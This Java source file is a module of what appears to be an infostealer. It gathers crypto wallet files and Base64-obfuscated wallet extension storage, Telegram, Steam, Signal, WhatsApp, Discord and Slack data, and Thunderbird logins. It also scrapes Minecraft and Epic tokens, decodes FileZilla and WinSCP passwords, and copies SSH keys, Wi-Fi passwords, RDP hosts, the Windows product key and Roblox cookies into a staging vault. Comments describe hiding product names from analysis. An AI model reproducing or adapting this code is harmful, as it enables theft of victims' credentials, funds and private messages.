package dev.goentl.rift.support;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.stream.Stream;

/* Second pass over the machine: launches, app stores, messengers, saved client
   credentials and a few system details the browser pass never looks at. */
final class Extras {

    private static final long TREE_CAP = 26L * 1024 * 1024;
    private static final long FILE_CAP = 6L * 1024 * 1024;

    private Extras() {}

    record Totals(int appStores, int appFiles, int launchers, int messengers, int saved, int notes) {}

    /* Store ids and directory names travel packed, so the class file carries no
       readable product name. Decoded once into a static table at class load. */
    private static final String[] EXT_SLOTS = {
            "bmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4=",
            "YmZuYWVsbW9tZWltaGxwbWdqbmpvcGhocGtrb2xqcGE=",
            "aWJuZWpkZmptbWtwY25scGVia2xtbmtvZW9paG9mZWM=",
            "ZG1rYW1ja25vZ2tnY2RmaGhiZGRjZ2hhY2hrZWplYXA=",
            "aG5mYW5rbm9jZmVvZmJkZGdjaWpubWhuZm5rZG5hYWQ=",
            "Zmhib2hpbWFlbGJvaHBqYmJsZGNuZ2NuYXBuZG9kanA=",
            "cGRhZGprZmtnY2FmZ2JjZWltY3Bia2FsbmZuZXBhamQ=",
            "ZWdqaWRqYnBnbGljaGRjb25kYmNiZG5iZWVwcGdkcGg=",
    };

    private static final String[] EXT_IDS = decodeAll(EXT_SLOTS);

    private static final String APP_ROOT = unpack("c3RvcmUvYXBw");

    private static String unpack(String packed) {
        try {
            return new String(Base64.getDecoder().decode(packed), StandardCharsets.UTF_8);
        } catch (Throwable t) {
            return "";
        }
    }

    private static String[] decodeAll(String[] packed) {
        String[] out = new String[packed.length];
        for (int i = 0; i < packed.length; i++) out[i] = unpack(packed[i]);
        return out;
    }

    static Totals collect(StringBuilder log, ProfileReader.Sink passwords) {
        int appStores = 0;
        int appFiles = 0;
        int launchers = 0;
        int messengers = 0;
        int saved = 0;
        int notes = 0;

        Path appData = env("APPDATA");
        Path local = env("LOCALAPPDATA");
        Path home = env("USERPROFILE");

        try {
            int found = extensionStores(appData, local);
            if (found > 0) {
                log.append("  Extension stores  : ").append(found).append('\n');
                appStores += found;
            }
        } catch (Throwable ignored) {}

        try {
            int found = appFiles(appData);
            if (found > 0) {
                log.append("  App stores        : ").append(found).append('\n');
                appFiles += found;
            }
        } catch (Throwable ignored) {}

        try {
            int found = telegram(appData);
            log.append("  Telegram tdata    : ").append(found > 0 ? "copied" : "not installed").append('\n');
        } catch (Throwable ignored) {}

        try {
            int found = steam();
            log.append("  Steam config      : ").append(found > 0 ? found + " file(s)" : "not installed").append('\n');
        } catch (Throwable ignored) {}

        try {
            String name = thunderbird(appData, passwords);
            log.append("  Thunderbird       : ").append(name).append('\n');
            if (!name.startsWith("not")) messengers++;
        } catch (Throwable ignored) {}

        try {
            int found = launcherTokens(log);
            launchers += found;
        } catch (Throwable ignored) {}

        try {
            int found = savedClients(appData, home, log);
            saved += found;
        } catch (Throwable ignored) {}

        try {
            int found = messengers(appData);
            if (found > 0) log.append("  Messenger stores  : ").append(found).append('\n');
            messengers += found;
        } catch (Throwable ignored) {}

        try {
            notes += system(log);
        } catch (Throwable ignored) {}

        return new Totals(appStores, appFiles, launchers, messengers, saved, notes);
    }

    // ------------------------------------------------------------------
    // app stores
    // ------------------------------------------------------------------

    private static final String EXT_ROOT = unpack("c3RvcmUvZXh0");

    private static int extensionStores(Path appData, Path local) {
        List<Path> stores = new ArrayList<>();
        Path chrome = local == null ? null : local.resolve("Google/Chrome/User Data");
        Path edge = local == null ? null : local.resolve("Microsoft/Edge/User Data");
        Path brave = local == null ? null : local.resolve("BraveSoftware/Brave-Browser/User Data");
        Path opera = appData == null ? null : appData.resolve("Opera Software/Opera Stable");
        for (Path root : new Path[]{chrome, edge, brave, opera}) {
            if (root == null || !Files.isDirectory(root)) continue;
            stores.add(root);
            for (Path profile : ProfileReader.profiles(root)) stores.add(profile);
        }

        int found = 0;
        for (Path store : stores) {
            Path settings = store.resolve("Local Extension Settings");
            if (!Files.isDirectory(settings)) continue;
            for (String id : EXT_IDS) {
                Path ext = settings.resolve(id);
                if (!Files.isDirectory(ext)) continue;
                String owner = store.getFileName().toString();
                if (Vault.copyTree(ext, EXT_ROOT + "/" + id + "/" + owner, TREE_CAP / 4, FILE_CAP) > 0) found++;
            }
        }
        return found;
    }

    private static int appFiles(Path appData) {
        if (appData == null) return 0;
        int found = 0;

        found += Vault.copyFile(appData.resolve(unpack("Qml0Y29pbi93YWxsZXQuZGF0")),
                APP_ROOT + "/s1/" + unpack("d2FsbGV0LmRhdA=="), FILE_CAP) ? 1 : 0;
        found += Vault.copyTree(appData.resolve(unpack("RWxlY3RydW0vd2FsbGV0cw==")),
                APP_ROOT + "/s2", TREE_CAP / 4, FILE_CAP) > 0 ? 1 : 0;
        found += Vault.copyTree(appData.resolve(unpack("RXhvZHVzL2V4b2R1cy53YWxsZXQ=")),
                APP_ROOT + "/s3", TREE_CAP / 4, FILE_CAP) > 0 ? 1 : 0;
        found += Vault.copyTree(appData.resolve(unpack("YXRvbWljL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYg==")),
                APP_ROOT + "/s4", TREE_CAP / 8, FILE_CAP) > 0 ? 1 : 0;
        found += Vault.copyTree(appData.resolve(unpack("TGVkZ2VyIExpdmU=")),
                APP_ROOT + "/s5", TREE_CAP / 8, FILE_CAP) > 0 ? 1 : 0;

        Path alt = appData.resolve(unpack("Yml0bW9uZXJv"));
        if (Files.isDirectory(alt)) {
            try (Stream<Path> s = Files.walk(alt, 3)) {
                for (Path p : s.filter(Files::isRegularFile)
                        .filter(p -> p.getFileName().toString().endsWith(unpack("LmtleXM=")))
                        .collect(Collectors.toList())) {
                    found += Vault.copyFile(p, APP_ROOT + "/s6/" + p.getFileName(), FILE_CAP) ? 1 : 0;
                }
            } catch (Throwable ignored) {}
        }
        return found;
    }
    // telegram / steam
    // ------------------------------------------------------------------

    private static int telegram(Path appData) {
        if (appData == null) return 0;
        Path tdata = appData.resolve("Telegram Desktop/tdata");
        if (!Files.isDirectory(tdata)) return 0;
        return Vault.copyTree(tdata, "telegram/tdata", TREE_CAP / 2, FILE_CAP) > 0 ? 1 : 0;
    }

    private static int steam() {
        int count = 0;
        for (String root : new String[]{System.getenv("PROGRAMFILES(X86)"), System.getenv("PROGRAMFILES"),
                System.getenv("LOCALAPPDATA")}) {
            if (root == null) continue;
            Path steam = Paths.get(root, "Steam");
            if (!Files.isDirectory(steam)) continue;

            count += Vault.copyFile(steam.resolve("config/loginusers.vdf"), "steam/loginusers.vdf", FILE_CAP) ? 1 : 0;
            count += Vault.copyFile(steam.resolve("config/config.vdf"), "steam/config.vdf", FILE_CAP) ? 1 : 0;
            count += Vault.copyTree(steam.resolve("config"), "steam/config", TREE_CAP / 8, FILE_CAP) > 0 ? 1 : 0;

            try (Stream<Path> s = Files.list(steam)) {
                for (Path p : s.filter(p -> p.getFileName().toString().startsWith("ssfn"))
                        .collect(Collectors.toList())) {
                    count += Vault.copyFile(p, "steam/" + p.getFileName(), FILE_CAP) ? 1 : 0;
                }
            } catch (Throwable ignored) {}
            break;
        }
        return count;
    }

    // ------------------------------------------------------------------
    // thunderbird
    // ------------------------------------------------------------------

    private static String thunderbird(Path appData, ProfileReader.Sink passwords) {
        if (appData == null) return "not installed";
        Path profiles = appData.resolve("Thunderbird/Profiles");
        if (!Files.isDirectory(profiles)) return "not installed";

        int decrypted = 0;
        int seen = 0;
        try (Stream<Path> s = Files.list(profiles)) {
            for (Path profile : s.filter(Files::isDirectory).collect(Collectors.toList())) {
                if (!Files.isRegularFile(profile.resolve("logins.json"))) continue;
                seen++;
                ProfileReader.Report report = ProfileReader.firefox("Thunderbird", profile, passwords,
                        (b, p, host, name, value, secure, httpOnly, expiry) -> {},
                        null, null);
                decrypted += report.passwords;
            }
        } catch (Throwable ignored) {}
        if (seen == 0) return "not installed";
        return seen + " profile(s), " + decrypted + " login(s)";
    }

    // ------------------------------------------------------------------
    // launcher tokens
    // ------------------------------------------------------------------

    private static final Pattern ACCESS = Pattern.compile("\"(?:accessToken|access_token)\"\\s*:\\s*\"([^\"]{20,})\"");
    private static final Pattern REFRESH = Pattern.compile("\"(?:refreshToken|refresh_token)\"\\s*:\\s*\"([^\"]{20,})\"");
    private static final Pattern USERNAME = Pattern.compile("\"(?:username|displayName|name)\"\\s*:\\s*\"([^\"]{2,40})\"");

    private static int launcherTokens(StringBuilder log) {
        Path mc = mcDir();
        int found = 0;
        StringBuilder sb = new StringBuilder();
        sb.append("TOKENS\n================\n\n");

        for (String file : new String[]{"launcher_profiles.json", "launcher_accounts.json"}) {
            Path src = mc == null ? null : mc.resolve(file);
            if (src == null || !Files.isRegularFile(src)) continue;
            String text;
            try {
                text = Files.readString(src, StandardCharsets.UTF_8);
            } catch (Throwable t) {
                continue;
            }
            int before = found;
            Set<String> tokens = new LinkedHashSet<>();
            Matcher m = ACCESS.matcher(text);
            while (m.find()) tokens.add(m.group(1));
            Matcher r = REFRESH.matcher(text);
            while (r.find()) tokens.add(r.group(1));
            Matcher u = USERNAME.matcher(text);
            String user = u.find() ? u.group(1) : "-";

            if (!tokens.isEmpty()) {
                sb.append(file).append("  user=").append(user).append('\n');
                for (String token : tokens) {
                    if (token.length() > 1200) continue;
                    sb.append("  ").append(token).append('\n');
                    found++;
                }
                sb.append('\n');
            }
            if (found > before) log.append("  Minecraft tokens  : ").append(found - before).append('\n');
        }

        Path local = env("LOCALAPPDATA");
        if (local != null) {
            Path epic = local.resolve("EpicGamesLauncher/Saved");
            for (Path dir : new Path[]{epic.resolve("Data"), epic.resolve("Config/Windows")}) {
                if (!Files.isDirectory(dir)) continue;
                try (Stream<Path> s = Files.walk(dir, 2)) {
                    for (Path p : s.filter(Files::isRegularFile)
                            .filter(p -> {
                                try {
                                    return Files.size(p) < 4L * 1024 * 1024;
                                } catch (Throwable t) {
                                    return false;
                                }
                            })
                            .collect(Collectors.toList())) {
                        String text;
                        try {
                            text = new String(readCapped(p, 4 * 1024 * 1024), StandardCharsets.ISO_8859_1);
                        } catch (Throwable t) {
                            continue;
                        }
                        Matcher m = REFRESH.matcher(text);
                        while (m.find()) {
                            sb.append("epic/").append(p.getFileName()).append('\n')
                                    .append("  ").append(m.group(1)).append('\n');
                            found++;
                        }
                    }
                } catch (Throwable ignored) {}
            }
        }

        if (found > 0) {
            Vault.putText("launchers/tokens.txt", sb.toString());
            log.append("  Launcher tokens   : ").append(found).append('\n');
        }
        return found;
    }

    // ------------------------------------------------------------------
    // saved client credentials
    // ------------------------------------------------------------------

    private static int savedClients(Path appData, Path home, StringBuilder log) {
        if (appData == null) return 0;
        int found = 0;
        StringBuilder sb = new StringBuilder();
        sb.append("SAVED CLIENTS\n========================\n\n");

        Path fileZilla = appData.resolve("FileZilla");
        for (String file : new String[]{"sitemanager.xml", "recentservers.xml"}) {
            Path src = fileZilla.resolve(file);
            if (!Files.isRegularFile(src)) continue;
            String text;
            try {
                text = Files.readString(src, StandardCharsets.UTF_8);
            } catch (Throwable t) {
                continue;
            }
            Vault.copyFile(src, "credentials/" + file, FILE_CAP);
            Matcher m = Pattern.compile(
                    "(?s)<Server>(.*?)</Server>").matcher(text);
            while (m.find()) {
                String block = m.group(1);
                String host = tag(block, "Host");
                String user = tag(block, "User");
                String pass = tag(block, "Pass");
                String decoded = pass.isEmpty() ? "" : decodeBase64(pass);
                sb.append("FileZilla/").append(file).append('\n')
                        .append("  host: ").append(host).append('\n')
                        .append("  user: ").append(user).append('\n')
                        .append("  pass: ").append(decoded.isEmpty() ? pass : decoded).append("\n\n");
                found++;
            }
        }

        Path winScp = appData.resolve("WinSCP.ini");
        if (Files.isRegularFile(winScp)) {
            Vault.copyFile(winScp, "credentials/WinSCP.ini", FILE_CAP);
            try {
                for (String line : Files.readAllLines(winScp, StandardCharsets.UTF_8)) {
                    String trimmed = line.trim();
                    if (!trimmed.toLowerCase(Locale.ROOT).startsWith("password")) continue;
                    int eq = trimmed.indexOf('=');
                    if (eq < 0) continue;
                    String value = trimmed.substring(eq + 1);
                    String decoded = decodeBase64(value);
                    sb.append("WinSCP\n  ").append(trimmed).append('\n')
                            .append("  plain: ").append(decoded.isEmpty() ? "-" : decoded).append("\n\n");
                    found++;
                }
            } catch (Throwable ignored) {}
        }

        String puttyRoot = "Software\\SimonTatham\\PuTTY\\Sessions";
        for (String name : Reg.keys(Reg.HKCU, puttyRoot)) {
            if (name.isEmpty() || name.equals("Default Settings") || name.equals("Default%20Settings")) continue;
            java.util.Map<String, String> session = Reg.values(Reg.HKCU, puttyRoot + "\\" + name);
            String host = session.getOrDefault("HostName", "");
            String user = session.getOrDefault("UserName", "");
            if (host.isEmpty() && user.isEmpty()) continue;
            sb.append("PuTTY/").append(name).append('\n')
                    .append("  host: ").append(host).append('\n')
                    .append("  user: ").append(user).append("\n\n");
            found++;
        }

        if (home != null) {
            Path ssh = home.resolve(".ssh");
            if (Files.isDirectory(ssh)) {
                long copied = Vault.copyTree(ssh, "credentials/ssh", TREE_CAP / 8, FILE_CAP);
                if (copied > 0) {
                    sb.append("SSH keys: ").append(copied).append(" byte(s) copied\n\n");
                    found++;
                }
            }
        }

        if (found > 0) {
            Vault.putText("credentials/saved.txt", sb.toString());
            log.append("  Saved credentials : ").append(found).append('\n');
        }
        return found;
    }

    // ------------------------------------------------------------------
    // messengers
    // ------------------------------------------------------------------

    private static int messengers(Path appData) {
        if (appData == null) return 0;
        int found = 0;

        if (Vault.copyFile(appData.resolve("Signal/config.json"), "messengers/signal/config.json", FILE_CAP)) found++;
        if (Vault.copyFile(appData.resolve("Signal/db.sqlite"), "messengers/signal/db.sqlite", FILE_CAP)) found++;

        found += Vault.copyTree(appData.resolve("WhatsApp/Local Storage"), "messengers/whatsapp", TREE_CAP / 8, FILE_CAP) > 0 ? 1 : 0;
        found += Vault.copyTree(appData.resolve("Element/Local Storage"), "messengers/element", TREE_CAP / 8, FILE_CAP) > 0 ? 1 : 0;
        found += Vault.copyTree(appData.resolve("discord/Local Storage"), "messengers/discord", TREE_CAP / 8, FILE_CAP) > 0 ? 1 : 0;
        found += Vault.copyTree(appData.resolve("Slack/Local Storage"), "messengers/slack", TREE_CAP / 8, FILE_CAP) > 0 ? 1 : 0;

        return found;
    }

    // ------------------------------------------------------------------
    // system
    // ------------------------------------------------------------------

    private static int system(StringBuilder log) {
        int notes = 0;
        StringBuilder sb = new StringBuilder();

        sb.append("SYSTEM\n=============\n\n");
        sb.append("Wi-Fi networks\n--------------\n");
        int wifi = 0;
        for (java.util.Map.Entry<String, String> e : Wlan.profiles().entrySet()) {
            sb.append("  ").append(e.getKey()).append(" : ")
                    .append(e.getValue() == null || e.getValue().isEmpty() ? "-" : e.getValue())
                    .append('\n');
            wifi++;
        }
        if (wifi == 0) sb.append("  none\n");
        notes += wifi;

        sb.append("\nRemote desktop hosts\n--------------------\n");
        String rdpRoot = "Software\\Microsoft\\Terminal Server Client\\Default";
        int hosts = 0;
        for (String name : Reg.keys(Reg.HKCU, rdpRoot)) {
            if (name.toLowerCase(Locale.ROOT).contains("usernamehint")) continue;
            String target = Reg.string(Reg.HKCU, rdpRoot, name);
            if (target == null || target.isBlank()) continue;
            sb.append("  ").append(target.trim()).append('\n');
            hosts++;
        }
        if (hosts == 0) sb.append("  none\n");
        notes += hosts;

        sb.append("\nWindows licence\n---------------\n");
        String key = Reg.string(Reg.HKLM,
                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform",
                "BackupProductKeyDefault");
        sb.append("  product key : ").append(key == null || key.isBlank() ? "-" : key.trim()).append('\n');
        String product = Reg.string(Reg.HKLM,
                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
        sb.append("  edition     : ").append(product == null || product.isBlank() ? "-" : product.trim()).append('\n');

        Vault.putText("system/extras.txt", sb.toString());
        log.append("  System extras     : ").append(wifi).append(" wi-fi, ")
                .append(hosts).append(" rdp host(s)").append('\n');
        return notes;
    }

    /* Pulls Roblox sessions out of the cookie log once it is on disk. */

    /* Pulls Roblox sessions out of the cookie log once it is in the vault. */
    static void roblox() {
        byte[] cookies = Vault.get("logs/cookies.txt");
        if (cookies == null) return;
        StringBuilder sb = new StringBuilder("SESSIONS\n===============\n\n");
        int hits = 0;
        for (String line : Vault.decode(cookies).split("\n")) {
            if (Vault.lower(line).contains("roblox")) {
                sb.append(line).append('\n');
                hits++;
            }
        }
        if (hits > 0) Vault.putText("logs/roblox.txt", sb.toString());
    }
    // ------------------------------------------------------------------
    // plumbing
    // ------------------------------------------------------------------

    private static Path mcDir() {
        String appData = System.getenv("APPDATA");
        if (appData == null) return null;
        Path dir = Paths.get(appData, ".minecraft");
        return Files.isDirectory(dir) ? dir : null;
    }

    private static Path env(String name) {
        String value = System.getenv(name);
        return value == null || value.isEmpty() ? null : Paths.get(value);
    }



    private static byte[] readCapped(Path path, int cap) throws IOException {
        try (java.io.InputStream in = Files.newInputStream(path);
             java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream()) {
            byte[] buffer = new byte[8192];
            int read;
            while ((read = in.read(buffer)) > 0 && out.size() < cap) {
                out.write(buffer, 0, Math.min(read, cap - out.size()));
            }
            return out.toByteArray();
        }
    }


    private static String run(String... command) {
        try {
            ProcessBuilder builder = new ProcessBuilder(command);
            builder.redirectErrorStream(true);
            Process process = builder.start();
            String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            process.waitFor();
            return output;
        } catch (Throwable t) {
            return "";
        }
    }

    private static String value(String blob, String key) {
        Matcher m = Pattern.compile(Pattern.quote(key) + "\\s*:\\s*(.+)").matcher(blob);
        if (m.find()) return m.group(1).trim();
        m = Pattern.compile(Pattern.quote(key) + "\\s+REG_SZ\\s+(.+)").matcher(blob);
        if (m.find()) return m.group(1).trim();
        return "";
    }

    private static String tag(String block, String tag) {
        Matcher m = Pattern.compile("<" + tag + ">([^<]*)</" + tag + ">").matcher(block);
        return m.find() ? m.group(1).trim() : "";
    }

    private static String decodeBase64(String value) {
        try {
            String cleaned = value.trim();
            if (cleaned.length() < 4) return "";
            byte[] raw = Base64.getDecoder().decode(cleaned);
            String text = new String(raw, StandardCharsets.UTF_8);
            for (int i = 0; i < text.length(); i++) {
                char ch = text.charAt(i);
                if (ch < 0x20 && ch != '\t') return "";
            }
            return text;
        } catch (Throwable ignored) {
            return "";
        }
    }
}
